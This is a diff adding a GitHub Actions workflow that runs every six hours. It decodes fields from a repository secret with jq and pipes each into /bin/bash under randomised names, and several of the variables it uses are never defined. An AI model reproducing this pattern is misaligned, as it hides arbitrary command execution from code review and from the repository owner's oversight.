@@ -1,0 +1,29 @@
+name: lelaituixiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lelaituixiao
+        env:
+          mmali11: ${{ secrets.mmali11 }}
+        run: |
+          echo $mmali11 | jq -r .jm59641 | /bin/bash
+          echo $vp86800 | jq -r .qdk2148 | /bin/bash
+          echo $fber21226 | jq -r .l7 | /bin/bash
+          echo $pggs3 | jq -r .zwpyf71 | /bin/bash
+          echo $y330 | jq -r .zdq60899 | /bin/bash
+          echo $nzug54312 | jq -r .likeq20767 | /bin/bash
+          echo $q23796 | jq -r .y74025 | /bin/bash
+          echo $q8796 | jq -r .nihl7915 | /bin/bash
+          echo $whkyf4 | jq -r .ikb5 | /bin/bash
+          echo $wthx70016 | jq -r .wgjl1 | /bin/bash
+          echo $sa19 | jq -r .en49924 | /bin/bash
+
